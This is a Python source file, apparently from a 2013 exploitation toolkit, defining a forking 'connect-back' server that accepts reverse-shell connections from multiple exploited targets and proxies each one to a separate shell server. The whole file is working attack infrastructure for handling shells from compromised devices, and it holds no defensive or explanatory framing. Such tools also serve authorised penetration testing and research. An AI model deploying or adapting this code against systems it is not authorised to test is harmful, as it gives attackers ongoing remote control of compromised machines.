# Copyright (c) 2013
# - Zachary Cutlip <uid000@gmail.com>
# - Tactical Network Solutions, LLC
#
# See LICENSE.txt for more details.
#

import os
import signal
import socket
import select
import errno

from connectback_server import ConnectbackServer

class MultiplexingServer(ConnectbackServer):
    """
    A forking connect-back server that accepts and proxies multiple connections.
    
    Connect-back payloads from multiple exploited targets can connect back to
    this server and it will forward those connections on to the connect-back
    endpoints provided to the constructor.
    
    An example use case is single exploit that will cause multiple devices
    to connect back to the same host and port.  This server will accept all of
    those simultaneous connections and proxy them to the appropriate connect-back
    servers.
    
    """
    
    def __init__(self,connectback_ip,outbound_addresses,port=8080,outbound_ports=[],logger=None,connected_event=None):
        """
        Class constructor.

        Parameters
        ----------
        connectback_ip:     the address this server should bind to.
        outbound_addresses: A list of addresses that this server should connect
            to in turn.  If the same address is listed multiple times.  It will
            be connected to multiple times.  When a connection has been forwared
            to each address in the list, the server terminates.
        port: Optional. The port this server should bind to.  Default value is
            8080.
        outbound_ports:     Optional. a list of outbound ports corresponding to
            the addresses listed in oubound_addresses.  If no list is provided,
            the outbound ports will start with the listening port+1, and
            and increment by one for each additional connection.  If a list is
            provided but contains fewer ports than outbound addresses, the
            the remaining outbound ports will begin incrementing by one from the
            last port listed and used.
        logger: Optional.  A logger object is

        Examples
        --------
        Listen on the default port of 8080, accept two connections on 192.168.0.1,
        and forward them to localhost ports 8081 and 8082 before terminating.
        server=MultiplexingServer("192.168.0.1",["127.0.0.1","127.0.0.1"])
        
        Same as above, but forward to ports 9000 and 9001:
        server=MultiplexingServer("192.168.0.1",["127.0.0.1","127.0.0.1"],
                            outbound_ports=[9000,9001])
        
        Same as above, but forward to ports 8082 and 8082+1:
        server=MultiplexingServer("192.168.0.1",["127.0.0.1","127.0.0.1"],
                            outbound_ports=[8082])
        
        """
        super(self.__class__,self).__init__(connectback_ip,port=port,connectback_shell=False,logger=logger,
                                        connected_event=connected_event)

        self.outbound_ports=outbound_ports
        self.start_port=None
        if len(outbound_ports) == 0:
            self.start_port=self.port+1
        elif len(outbound_ports) == 1:
            self.start_port=outbound_ports[0]

        self.outbound_addresses=outbound_addresses
        self.pid=None
        self.child_pids=[]
    
    def _handle_connection(self,clientsocket,serversocket,address,port):
        logger=self.logger
        
        pid=os.fork()
        if pid and pid > 0:
            clientsocket.close()
            return pid
        else:
            serversocket.close()
        logger.LOG_DEBUG("Handling incoming connection. Pid %d" % os.getpid())
        
        outsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            logger.LOG_DEBUG("Connecting to %s:%s" % (address,port))
            outsocket.connect((address,port))
        except Exception as e:
            logger.LOG_WARN("There was an error connecting to %s:%d. %s" % (str(address),port,str(e)))
            self._exit()
        
        self._setup_signals() 
        max_read=self.__class__.MAX_READ
        inputlist=[clientsocket,outsocket]
        self.keepgoing=True
        while self.keepgoing:
            try:
                logger.LOG_DEBUG("Selecting.")
                logger.LOG_DEBUG("Client socket: %d" % clientsocket.fileno())
                inp,outp,excep=select.select(inputlist,[],[])
                for f in inp:
                    if f is clientsocket:
                        data=f.recv(max_read)
                        if data:
                            logger.LOG_DEBUG("Got %d bytes from client." % len(data))
                            outsocket.send(data)
                        else:
                            logger.LOG_INFO("Client closed connection.")
                            self.keepgoing=False
                    elif f is outsocket:
                        data=f.recv(max_read)
                        if data:
                            logger.LOG_DEBUG("Got %d bytes from outbound socket." % len(data))
                            clientsocket.send(data)
                        else:
                            logger.LOG_INFO("Shell server closed connection.")
                            self.keepgoing=False
                    else:
                        logger.LOG_WARN("select return ")
                            
            except Exception as e:
                logger.LOG_DEBUG("Error selecting: %s" % str(e))
                self.keepgoing=False
        
        self.logger.LOG_INFO("Closing connection to %s:%d" % (str(address),port))
        outsocket.shutdown(socket.SHUT_RDWR)
        outsocket.close()
        
        self.logger.LOG_INFO("Closing connection to client.")
        clientsocket.shutdown(socket.SHUT_RDWR)
        clientsocket.close()

    
        self._exit()
           
        
    
    def _next_port(self):
        if len(self.outbound_ports) > 0:
            port=self.outbound_ports.pop(0)
        else:
            self.logger.LOG_DEBUG("start_port: %s" % self.start_port)
            port=self.start_port
            self.start_port +=1
        return port
    
    def _serve_multiplexer(self,serversocket):
        logger=self.logger
        self._setup_signals()
        logger.LOG_INFO("Listening on port %d" % int(self.port))
        logger.LOG_INFO("Waiting for incoming connection.")
        self.keepgoing=True
        
        while (len(self.outbound_addresses) > 0) and self.keepgoing:
            logger.LOG_INFO("Accepting incoming connection.")
            (clientsocket,address) = serversocket.accept()
            logger.LOG_INFO("Target %s has phoned home" % address[0])
            logger.LOG_DEBUG("Client socket: %d" % clientsocket.fileno())
            try:
                address=self.outbound_addresses.pop(0)
                port=self._next_port()
                pid=self._handle_connection(clientsocket,serversocket,address,port)
                logger.LOG_DEBUG("Launched handler. Pid: %d" % pid)
                self.child_pids.append(pid)
            except Exception as e:
                logger.LOG_WARN("Error handling connection. %s" % str(e))
    
    def _child_wait(self):
        
        if not len(self.child_pids) > 0:
            return
        
        self.keepgoing=True
        signal.signal(signal.SIGINT,self._handler)
        for pid in self.child_pids:
            keepgoing=self.keepgoing
            while keepgoing:
                try:
                    status=os.waitpid(self.pid,0)
                    keepgoing=False
                except OSError as ose:
                    if not ose.errno == errno.EINTR:
                        keepgoing=False
        signal.signal(signal.SIGINT,signal.SIG_DFL)
        
        
        
    def _child_shutdown(self):
        for pid in self.child_pids:
            try:
                os.kill(pid,signal.SIGTERM)
                keepgoing=True
                while keepgoing:
                    try:
                        os.waitpid(pid,0)
                        keepgoing=False
                    except OSError as ose:
                        if not os.errno == errno.EINTR:
                            keepgoing=False
            except Exception as e:
                self.logger.LOG_WARN("Error shutting down server child pid: %d. %s" % (pid,str(e)))
    
    
    def serve(self):
        """
        Start the multiplexing server.

        This function forks and returns the child PID.  The child exits without
        returning.

        If server fails to bind an error is logged, and any exception is passed
        up to the caller.
        """
        if self.pid:
            raise ServerException("There is an existing child process. Pid: %d" % self.pid)
        
        try:
            serversocket=self._server()
        except Exception as e:
            self.logger.LOG_WARN("There was an error creating server socket: %s" % str(e))
            raise e
        
        self.pid = os.fork()
        if self.pid and self.pid > 0:
            serversocket.close()
            return self.pid
        else:
            try:
                self._serve_multiplexer(serversocket)
            except Exception as e:
                self.logger.LOG_WARN("There was an error serving multiplexed sessions. %s" % str(e))
            
            serversocket.shutdown(socket.SHUT_RDWR)
            serversocket.close()
            self._exit()

            
        
        